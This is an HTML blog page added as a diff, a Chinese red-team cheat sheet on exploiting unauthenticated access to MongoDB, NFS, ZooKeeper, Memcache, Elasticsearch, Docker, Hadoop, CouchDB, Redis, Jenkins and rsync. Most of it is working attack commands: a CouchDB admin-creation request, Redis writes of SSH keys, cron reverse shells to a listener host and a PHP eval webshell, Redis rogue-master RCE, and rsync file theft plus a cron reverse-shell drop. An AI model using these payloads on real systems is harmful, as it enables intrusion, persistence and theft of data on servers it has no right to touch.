@@ -1,0 +1,530 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    
+<meta charset="utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no" />
+<meta name="HandheldFriendly" content="True" />
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+<meta name="generator" content="Hugo 0.69.0-DEV" />
+
+
+<link rel="shortcut icon" href="https://cdn.jsdelivr.net/gh/amzrk2/cdn-stcapi@1/favicons/favicon.ico" />
+
+
+<title>常见应用未授权访问漏洞利用总结 - 道明君的博客</title>
+
+
+<meta name="author" content="道明君" />
+
+
+<meta name="description" content="A minimal Hugo theme with nice theme color." />
+
+
+<meta name="keywords" content="红队" />
+
+<meta property="og:title" content="常见应用未授权访问漏洞利用总结" />
+<meta property="og:description" content="总结目前开发和运维架构中，常用的应用未授权访问漏洞利用方式。包含MongoDB、nfs、ZooKeeper、Memcache、Elasticsearch、docker、Hadoop、CouchDB、RedisJenkins、rsync等。" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://xeye.io/post/%E5%B8%B8%E8%A7%81%E5%BA%94%E7%94%A8%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E6%80%BB%E7%BB%93/" />
+<meta property="og:image" content="https://xeye.io/img/og.png"/>
+<meta property="article:published_time" content="2020-08-11T17:20:01+08:00" />
+<meta property="article:modified_time" content="2020-08-11T17:20:01+08:00" />
+
+<meta name="twitter:card" content="summary_large_image"/>
+<meta name="twitter:image" content="https://xeye.io/img/og.png"/>
+
+<meta name="twitter:title" content="常见应用未授权访问漏洞利用总结"/>
+<meta name="twitter:description" content="总结目前开发和运维架构中，常用的应用未授权访问漏洞利用方式。包含MongoDB、nfs、ZooKeeper、Memcache、Elasticsearch、docker、Hadoop、CouchDB、RedisJenkins、rsync等。"/>
+
+
+
+<style>
+    @media (prefers-color-scheme: dark) {
+        body[data-theme='auto'] img {
+            filter: brightness(60%);
+        }
+    }
+
+    body[data-theme='dark'] img {
+        filter: brightness(60%);
+    }
+</style>
+
+
+<link rel="stylesheet" href="/assets/css/fuji.min.css" />
+
+
+<script async type="module" src="https://cdn.jsdelivr.net/npm/ionicons@5.0.1/dist/ionicons/ionicons.esm.js"></script>
+<script async nomodule src="https://cdn.jsdelivr.net/npm/ionicons@5.0.1/dist/ionicons/ionicons.js"></script>
+
+
+
+
+</head>
+
+<body data-theme="auto">
+    <script data-cfasync="false">
+    
+    var fujiThemeData = localStorage.getItem('fuji_data-theme');
+    
+    if (!fujiThemeData) {
+        localStorage.setItem('fuji_data-theme', 'auto');
+    } else {
+        
+        if (fujiThemeData !== 'auto') {
+            document.body.setAttribute('data-theme', fujiThemeData === 'dark' ? 'dark' : 'light');
+        }
+    }
+</script>
+<script data-cfasync="false">
+    
+    function browserDetection(ua) {
+        if (ua.indexOf('MSIE ') > 0 || ua.indexOf('Trident/') > 0) {
+            return true;
+        }
+        return false;
+    }
+
+    var ua = window.navigator.userAgent;
+    if (browserDetection(ua)) {
+        window.location.href('https:\/\/xeye.io\/ie\/');
+    }
+</script>
+    <header>
+    <div class="container-lg clearfix">
+        <div class="col-12 header">
+            <a class="title-main" href="https://xeye.io">道明君的博客</a>
+            
+            <span class="title-sub">君子有所为有所不为</span>
+            
+        </div>
+    </div>
+</header>
+
+    <main>
+        <div class="container-lg clearfix">
+            
+            <div class="col-12 col-md-9 float-left content">
+                
+<article>
+    
+    <h2 class="post-item post-title">
+        <a href="https://xeye.io/post/%E5%B8%B8%E8%A7%81%E5%BA%94%E7%94%A8%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E6%80%BB%E7%BB%93/">常见应用未授权访问漏洞利用总结</a>
+    </h2>
+    <div class="post-item post-meta">
+        <span><ion-icon name="today"></ion-icon>&nbsp;2020-08-11</span><span><ion-icon name="file-tray"></ion-icon>&nbsp;2518 words</span><span><ion-icon name="pricetags"></ion-icon>&nbsp;<a href="/tags/%E7%BA%A2%E9%98%9F">红队</a>&nbsp;</span>
+    </div>
+    
+    
+    <div class="post-content markdown-body">
+        <p>总结目前开发和运维架构中，常用的应用未授权访问漏洞利用方式。包含MongoDB、nfs、ZooKeeper、Memcache、Elasticsearch、docker、Hadoop、CouchDB、RedisJenkins、rsync等。</p>
+<h2 id="一mongodb">一、MongoDB</h2>
+<p>MongoDB默认端口27017，当配置成无验证时，存在未授权访问，使用msf中的scanner/mongodb/mongodb_login模块进行测试，使用navicat连接获取数据库中的内容。</p>
+<pre><code class="language-bash">use auxiliary/scanner/mongodb/mongodb_login
+set rhosts 192.168.90.0/24
+set threads 10
+exploit
+</code></pre>
+<p><img class="img-zoomable" src="https://xeye.io/static/images/20200811173043.png" alt="" />
+</p>
+<h2 id="二nfs">二、nfs</h2>
+<p>nfs默认端口2049，配置不当时，可以远程挂载nfs的共享目录。</p>
+<pre><code class="language-ruby">apt install nfs-common 安装nfs客户端
+showmount -e 192.168.70.162 查看nfs服务器上的共享目录
+mount -t nfs 192.168.70.162:/grdata /mnt 挂载到本地
+umount /mnt 卸载目录
+</code></pre>
+<p><img class="img-zoomable" src="https://xeye.io/static/images/20200811173109.png" alt="" />
+</p>
+<h2 id="三zookeeper">三、ZooKeeper</h2>
+<p>ZooKeeper是一个分布式的，开放源码的应用程序协调服务，默认端口2181，在未进行任何访问控制的情况下，存在未授权访问漏洞。</p>
+<pre><code class="language-bash">echo envi|nc 192.168.80.196 2181 列出服务环境有关的信息
+echo stat|nc 192.168.80.196 2181 列出关于性能和连接的客户端统计信息
+</code></pre>
+<p><img class="img-zoomable" src="https://xeye.io/static/images/20200811173232.png" alt="" />
+</p>
+<h2 id="四memcache">四、Memcache</h2>
+<p>memcache是一套分布式的高速缓存系统，它以Key-Value（键值对）形式将数据存储在内存中，默认开放11211端口，使用nmap的脚本进行扫描。</p>
+<pre><code class="language-bash">nmap 192.168.70.129 -p11211 --script=&quot;memcached-info.nse&quot;
+</code></pre>
+<p><img class="img-zoomable" src="https://xeye.io/static/images/20200811173318.png" alt="" />
+</p>
+<p>使用nc连接获取敏感信息</p>
+<ul>
+<li>stats  查看memcache 服务状态</li>
+<li>stats items  查看所有items</li>
+</ul>
+<p><img class="img-zoomable" src="https://xeye.io/static/images/20200811173406.png" alt="" />
+</p>
+<h2 id="五elasticsearch">五、Elasticsearch</h2>
+<p>Elasticsearch是用Java开发的企业级搜索引擎，默认端口9200，存在未授权访问漏洞时，可被非法操作数据。</p>
+<pre><code class="language-cpp">http://192.168.80.126:9200/_plugin/head/  web管理界面
+http://192.168.80.126:9200/_cat/indices  查看集群当前状态
+http://192.168.80.126:9200/_nodes  查看节点数据
+http://192.168.80.126:9200/_river/_search  查看数据库敏感信息
+</code></pre>
+<p><img class="img-zoomable" src="https://xeye.io/static/images/20200811173522.png" alt="" />
+</p>
+<h2 id="六docker">六、docker</h2>
+<p>该未授权访问漏洞是因为docker remote api可以执行docker命令，该接口的目的是取代docker命令界面，通过url操作docker。docker swarm是用来管理docker集群的，在开放2375端口监听集群容器时，会调用这个api。</p>
+<pre><code class="language-css">#安装类库
+pip install -r requirements.txt
+#查看运行的容器
+python dockerRemoteApiGetRootShell.py -h 192.168.80.221 -p 2375
+#查看所有的容器
+python dockerRemoteApiGetRootShell.py -h 192.168.80.221 -p 2375 -a
+#查看端口映射
+python dockerRemoteApiGetRootShell.py -h 192.168.80.221 -p 2375 -L
+#在容器中执行命令
+python dockerRemoteApiGetRootShell.py -h 192.168.80.221 -p 2375 -e &quot;whoami&quot; -I 容器id
+#查看服务端api版本
+python dockerRemoteApiGetRootShell.py -h 192.168.80.221 -p 2375 -V
+</code></pre>
+<p><img class="img-zoomable" src="https://xeye.io/static/images/20200811173551.png" alt="" />
+</p>
+<p>工具：<a href="https://links.jianshu.com/go?to=https%3A%2F%2Fgithub.com%2FTycx2ry%2Fdocker_api_vul" target="_blank">https://github.com/Tycx2ry/docker_api_vul</a></p>
+<h2 id="七hadoop">七、Hadoop</h2>
+<p>Hadoop是一个由Apache基金会所开发的分布式系统基础架构，Hadoop YARN ResourceManager WebUI页面如下：</p>
+<p><img class="img-zoomable" src="https://xeye.io/static/images/20200811172748.png" alt="" />
+</p>
+<p>在没有 hadoop client 的情况下，直接通过 REST API也可以提交任务执行。利用过程如下：</p>
+<ul>
+<li>在本地监听等待反弹 shell 连接</li>
+<li>调用 New Application API 创建 Application</li>
+<li>调用 Submit Application API 提交</li>
+</ul>
+<p><img class="img-zoomable" src="https://xeye.io/static/images/20200811173622.png" alt="" />
+</p>
+<p>工具：<a href="https://links.jianshu.com/go?to=https%3A%2F%2Fgithub.com%2Fvulhub%2Fvulhub%2Fblob%2Fmaster%2Fhadoop%2Funauthorized-yarn%2Fexploit.py" target="_blank">https://github.com/vulhub/vulhub/blob/master/hadoop/unauthorized-yarn/exploit.py</a></p>
+<h2 id="八couchdb">八、CouchDB</h2>
+<p>CouchDB是一个使用JSON作为存储格式，JavaScript作为查询语言，MapReduce和HTTP作为API的NoSQL数据库，2017年时被爆出了2个CVE：</p>
+<ul>
+<li>CVE-2017-12635垂直权限绕过
+发送如下数据包，可成功创建管理员用户，账户密码均为vulhub，web界面登录地址为：<a href="https://links.jianshu.com/go?to=http%3A%2F%2F192.168.70.45%3A5984%2F_utils%2F" target="_blank">http://192.168.70.45:5984/_utils/</a></li>
+</ul>
+<pre><code class="language-bash">PUT /_users/org.couchdb.user:vulhub HTTP/1.1
+Host: 192.168.70.45:5984
+Accept: */*
+Accept-Language: en
+User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
+Connection: close
+Content-Type: application/json
+Content-Length: 108
+
+{
+  &quot;type&quot;: &quot;user&quot;,
+  &quot;name&quot;: &quot;vulhub&quot;,
+  &quot;roles&quot;: [&quot;_admin&quot;],
+  &quot;roles&quot;: [],
+  &quot;password&quot;: &quot;vulhub&quot;
+}
+</code></pre>
+<p><img class="img-zoomable" src="https://xeye.io/static/images/20200811174005.png" alt="" />
+</p>
+<ul>
+<li>CVE-2017-12636任意命令执行
+Couchdb 2.x和1.x的API接口有一定区别，所以这个漏洞的利用方式也不同。使用以下exp，修改其中的target和command为你的测试机器，然后修改version为对应的Couchdb版本（1或2），可成功反弹shell。</li>
+</ul>
+<p><img class="img-zoomable" src="https://xeye.io/static/images/20200811173851.png" alt="" />
+</p>
+<p>工具：<a href="https://links.jianshu.com/go?to=https%3A%2F%2Fgithub.com%2Fvulhub%2Fvulhub%2Fblob%2Fmaster%2Fcouchdb%2FCVE-2017-12636%2Fexp.py" target="_blank">https://github.com/vulhub/vulhub/blob/master/couchdb/CVE-2017-12636/exp.py</a></p>
+<h2 id="九redis">九、Redis</h2>
+<p>Redis安装完成后，默认是没有账号密码的，如果配置不当可能造成未授权访问漏洞。主要有以下三种利用方式：</p>
+<ol>
+<li>写ssh公钥，需要root权限
+利用过程：</li>
+</ol>
+<pre><code class="language-bash">ssh-keygen -t rsa  生成ssh公钥和私钥
+(echo -e &quot;\n\n&quot;; cat id_rsa.pub; echo -e &quot;\n\n&quot;) &gt; key.txt  将公钥保存成key.txt
+cat /root/.ssh/key.txt | redis-cli -h 192.168.80.44 -x set xxx  写入redis
+redis-cli -h 192.168.80.44  连接redis
+config set dir /root/.ssh  设置写文件的目录
+config set dbfilename authorized_keys  设置写入的文件名
+save
+</code></pre>
+<p>使用ssh远程登录：</p>
+<pre><code class="language-css">ssh root@192.168.80.44 -p 22622
+</code></pre>
+<ol>
+<li>写定时任务，需要root权限
+利用过程：</li>
+</ol>
+<pre><code class="language-csharp">redis-cli -h 192.168.80.44
+set xxx &quot;\n\n*/1 * * * * /bin/bash -i&gt;&amp;/dev/tcp/192.168.40.155/4444 0&gt;&amp;1\n\n&quot;
+config set dir /var/spool/cron  设置写文件的目录
+config set dbfilename root  设置写入的文件名
+save
+</code></pre>
+<p>使用nc接收shell：</p>
+<pre><code class="language-undefined">nc -nvvlp 4444
+</code></pre>
+<p>补充：可利用cron的位置</p>
+<pre><code class="language-csharp">/etc/crontab
+/etc/cron.d/
+/var/spool/cron/root为centos系统root用户的cron文件
+/var/spool/cron/crontabs/root为debian系统root用户的cron文件
+</code></pre>
+<ol>
+<li>写webshell，需要知道web路径
+利用过程：</li>
+</ol>
+<pre><code class="language-dart">redis-cli -h 192.168.80.44
+config set dir /var/www/html
+set xxx &quot;\n\n\n&lt;?php@eval($_POST['c']);?&gt;\n\n\n&quot;
+config set dbfilename webshell.php
+save
+</code></pre>
+<p>4.利用主从复制getshell
+root用户会收到root的shell，redis用户会收到redis的shell。</p>
+<pre><code class="language-php">git clone https://github.com/n0b0dyCN/RedisModules-ExecuteCommand
+cd RedisModules-ExecuteCommand/
+make
+git clone https://github.com/Ridter/redis-rce
+python redis-rce.py -r 192.168.80.147 -L 192.168.80.166 -f module.so
+</code></pre>
+<p><img class="img-zoomable" src="https://xeye.io/static/images/20200811174045.png" alt="" />
+</p>
+<pre><code class="language-undefined">nc -nvvlp 81 服务器上监听81端口
+</code></pre>
+<p><img class="img-zoomable" src="https://xeye.io/static/images/20200811174232.png" alt="" />
+</p>
+<p>5.Windows下如何getshell？</p>
+<ul>
+<li>写入webshell，需要知道web路径</li>
+<li>写入启动项，需要目标服务器重启</li>
+<li>写入MOF，MOF每隔5秒钟会自动执行一次，适用于Windows2003。</li>
+</ul>
+<p>补充：redis常用命令</p>
+<pre><code class="language-csharp">info、keys *、set animal 'Cat'、get animal、del animal、config get dir、config get dbfilename
+</code></pre>
+<h2 id="十jenkins">十、Jenkins</h2>
+<p>默认情况下 Jenkins 面板中可以使用脚本命令行，攻击者通过未授权访问漏洞执行系统命令从而获取服务器的权限。</p>
+<pre><code class="language-cpp">http://www.example.com:8080/manage
+http://www.example.com:8080/script
+</code></pre>
+<ul>
+<li>
+<p>执行系统命令：</p>
+<p><code>println &quot;ls&quot;.execute().text</code></p>
+</li>
+</ul>
+<p><img class="img-zoomable" src="https://xeye.io/static/images/20200811174337.png" alt="" />
+</p>
+<ul>
+<li>反弹shell</li>
+</ul>
+<p><img class="img-zoomable" src="https://xeye.io/static/images/20200811174502.png" alt="" />
+</p>
+<h2 id="十一rsync">十一、rsync</h2>
+<ul>
+<li>查看模块名列表</li>
+</ul>
+<pre><code class="language-ruby">root@kali:~# nmap 192.168.80.201 -p 873 -n -Pn --script=&quot;rsync-list-modules.nse&quot;
+root@kali:~# rsync rsync://192.168.80.201:873/
+</code></pre>
+<p><img class="img-zoomable" src="https://xeye.io/static/images/20200811174526.png" alt="" />
+</p>
+<ul>
+<li>查看模块下的文件</li>
+</ul>
+<pre><code class="language-ruby">root@kali:~# rsync rsync://192.168.80.201:873/src/
+</code></pre>
+<p><img class="img-zoomable" src="https://xeye.io/static/images/20200811174604.png" alt="" />
+</p>
+<ul>
+<li>下载任意文件</li>
+</ul>
+<pre><code class="language-ruby">root@kali:~# rsync -av rsync://192.168.80.201:873/src/etc/passwd ./
+</code></pre>
+<ul>
+<li>通过写文件getshell</li>
+</ul>
+<ol>
+<li>写入webshell</li>
+</ol>
+<pre><code class="language-ruby">root@kali:~# rsync -av webshell.php rsync://192.168.80.201:873/src/var/webshell.php
+</code></pre>
+<ol>
+<li>写入定时任务
+首先查看当前有哪些定时任务：</li>
+</ol>
+<pre><code class="language-ruby">root@kali:~# rsync -av rsync://192.168.80.201:873/src/etc/crontab ./
+root@kali:~# cat crontab 
+</code></pre>
+<p><img class="img-zoomable" src="https://xeye.io/static/images/20200811174648.png" alt="" />
+</p>
+<p>然后创建一个shell文件</p>
+<pre><code class="language-bash">root@kali:~# vim shell
+
+#!/bin/bash 
+/bin/bash -i &gt;&amp; /dev/tcp/192.168.80.221/4444 0&gt;&amp;1
+
+root@kali:~# chmod +x shell
+</code></pre>
+<p>最后将shell文件写入定时任务(注意每小时的第17分钟会执行)</p>
+<pre><code class="language-ruby">root@kali:~# rsync -av shell rsync://192.168.80.201:873/src/etc/cron.hourly
+</code></pre>
+<p><img class="img-zoomable" src="https://xeye.io/static/images/20200811174715.png" alt="" />
+</p>
+<h2 id="参考">参考：</h2>
+<p><a href="https://vulhub.org">https://vulhub.org</a></p>
+<p><a href="https://paper.seebug.org/409/#0x02-redis">https://paper.seebug.org/409/#0x02-redis</a></p>
+<p><a href="https://xz.aliyun.com/t/2320#toc-42">https://xz.aliyun.com/t/2320#toc-42</a></p>
+<hr>
+<blockquote>
+<p>作者：Instu
+链接：https://www.jianshu.com/p/40fbd63cf982</p>
+</blockquote>
+    </div>
+</article>
+
+
+<div class="license markdown-body">
+    <blockquote>
+        <p>Unless otherwise noted, the content of this site is licensed under <a rel="license" href="http://creativecommons.org/licenses/by-nc-sa/4.0/"
+               target="_blank">CC BY-NC-SA 4.0</a>.</p>
+    </blockquote>
+</div>
+
+
+
+            </div>
+            <aside class="col-12 col-md-3 float-left sidebar">
+    
+    <div class="sidebar-item sidebar-pages">
+        <h3>Pages</h3>
+        <ul>
+            
+            <li>
+                <a href="/">主页</a>
+            </li>
+            
+            <li>
+                <a href="/archives/">归档</a>
+            </li>
+            
+            <li>
+                <a href="/about/">关于</a>
+            </li>
+            
+            <li>
+                <a href="/search/">搜索</a>
+            </li>
+            
+            <li>
+                <a href="/index.xml">RSS</a>
+            </li>
+            
+        </ul>
+    </div>
+    
+    <div class="sidebar-item sidebar-tags">
+        <h3>Tags</h3>
+        <div>
+            
+            <span>
+                <a href="/tags/spf/">SPF</a>
+            </span>
+            
+            <span>
+                <a href="/tags/%E5%AE%89%E5%85%A8%E5%BB%BA%E8%AE%BE/">安全建设</a>
+            </span>
+            
+            <span>
+                <a href="/tags/%E7%BA%A2%E9%98%9F/">红队</a>
+            </span>
+            
+            <span>
+                <a href="/tags/%E8%93%9D%E9%98%9F/">蓝队</a>
+            </span>
+            
+            <span>
+                <a href="/tags/%E9%98%85%E8%AF%BB/">阅读</a>
+            </span>
+            
+            <span>
+                <a href="/tags/%E9%9D%B6%E6%9C%BA/">靶机</a>
+            </span>
+            
+        </div>
+    </div>
+    
+    <div class="sidebar-item sidebar-links">
+        <h3>Links</h3>
+        <ul>
+            
+            <li>
+                <a href="https://github.com/" target="_blank"><span>GitHub</span></a>
+            </li>
+            
+            <li>
+                <a href="https://twitter.com/" target="_blank"><span>Twitter</span></a>
+            </li>
+            
+            <li>
+                <a href="https://space.bilibili.com/" target="_blank"><span>bilibili</span></a>
+            </li>
+            
+        </ul>
+    </div>
+    
+    
+    
+    <div class="sidebar-item sidebar-toc">
+        <h3>TOC</h3>
+        <nav id="TableOfContents">
+  <ul>
+    <li><a href="#一mongodb">一、MongoDB</a></li>
+    <li><a href="#二nfs">二、nfs</a></li>
+    <li><a href="#三zookeeper">三、ZooKeeper</a></li>
+    <li><a href="#四memcache">四、Memcache</a></li>
+    <li><a href="#五elasticsearch">五、Elasticsearch</a></li>
+    <li><a href="#六docker">六、docker</a></li>
+    <li><a href="#七hadoop">七、Hadoop</a></li>
+    <li><a href="#八couchdb">八、CouchDB</a></li>
+    <li><a href="#九redis">九、Redis</a></li>
+    <li><a href="#十jenkins">十、Jenkins</a></li>
+    <li><a href="#十一rsync">十一、rsync</a></li>
+    <li><a href="#参考">参考：</a></li>
+  </ul>
+</nav>
+    </div>
+    
+    
+</aside>
+        </div>
+        <div class="btn">
+    <div class="btn-toggle-mode">
+        <ion-icon name="contrast"></ion-icon>
+    </div>
+    <div class="btn-scroll-top">
+        <ion-icon name="chevron-up"></ion-icon>
+    </div>
+</div>
+    </main>
+
+    <footer>
+    <div class="container-lg clearfix">
+        <div class="col-12 footer">
+            <span>&copy; 2020 <a href="https://xeye.io">道明君</a> |
+                Powered by <a href="https://github.com/amzrk2/hugo-theme-fuji/"
+                   target="_blank">Fuji-v2</a> & <a href="https://gohugo.io/"
+                   target="_blank">Hugo</a> </span>
+        </div>
+    </div>
+</footer>
+    
+    
+<script defer src="https://cdn.jsdelivr.net/combine/npm/medium-zoom@1.0.5,npm/lazysizes@5.2.2"></script>
+<script defer src="https://cdn.jsdelivr.net/npm/prismjs@1.20.0/components/prism-core.min.js"></script>
+<script defer src="https://cdn.jsdelivr.net/npm/prismjs@1.20.0/plugins/autoloader/prism-autoloader.min.js"></script>
+
+<script defer src="/assets/js/fuji.min.js"></script>
+
+</body>
+
+</html>
